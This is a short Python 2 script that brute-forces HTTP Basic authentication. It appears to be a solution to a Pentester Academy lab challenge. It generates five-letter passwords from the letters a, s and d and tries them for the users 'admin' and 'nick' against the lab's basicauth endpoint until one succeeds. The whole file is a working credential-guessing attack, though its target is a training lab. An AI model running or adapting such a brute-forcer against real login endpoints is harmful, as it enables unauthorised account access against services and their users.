import httplib		
import base64		
import wordlist
password=[]		
for a in ['a','s','d']:		    
	for b in ['a','s','d']:		        
		for c in ['a','s','d']:		            
			for d in ['a','s','d']:		                
				for e in ['a','s','d']:		                     
					password.append(a+b+c+d+e)		
					
gen = wordlist.Generator('ads')

user=['admin','nick']		
flag = 1
for u in user:		    
	for x in gen.generate(5,5):		                
		conn=httplib.HTTPConnection('pentesteracademylab.appspot.com')
		auth=u+":"+x
		
		headers={'Authorization': 'Basic '+auth.encode('base64','strict')[:-1]}    
		conn.request('POST','/lab/webapp/basicauth',"",headers)
		response=conn.getresponse()		        
		if flag == 0:
			break
		if "Unauthorized! Unauthorized! Unauthorized :) :)" in response.read():
			print "user s"+u+" Password: "+x+" Failed"
			response.status
		else:
			print "Challenge Cracked"		            
			print "Username: ",u		           
			print "Password: ",x
			flag=0
			break
		